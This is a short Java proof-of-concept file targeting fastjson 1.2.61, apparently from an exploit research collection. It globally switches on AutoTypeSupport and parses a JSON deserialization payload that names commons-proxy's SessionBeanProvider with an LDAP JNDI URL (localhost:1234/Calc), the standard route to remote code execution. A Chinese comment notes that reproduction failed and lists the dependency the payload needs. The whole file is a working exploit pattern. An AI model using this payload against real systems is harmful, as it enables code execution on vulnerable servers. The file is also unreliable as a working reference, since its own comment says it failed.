package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
/*
    复现失败
    需要开启AutoTypeSupport
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-proxy</artifactId>
        <version>1.0</version>
    </dependency>
*/
public class Poc_1_2_61 {
    public static void main(String[] args) {
        // turn on autoTypeSupport
        ParserConfig.global.setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:1234/Calc\",\"Object\":\"a\"}";
        JSON.parse(payload);
    }
}
